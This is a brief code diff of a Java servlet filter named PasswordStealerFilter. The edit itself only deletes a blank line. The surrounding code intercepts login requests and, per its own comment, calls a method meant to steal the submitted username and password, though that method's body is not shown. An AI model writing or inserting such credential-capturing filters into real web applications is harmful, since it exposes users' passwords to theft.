@@ -17,7 +17,6 @@ public class PasswordStealerFilter extends HttpFilter {
 
     @Override
     protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException {
-
         if (req.getRequestURI().contains("login")) {
             // before we go to log in we steal pass
             getLogAndPassAndLogging(req, res);
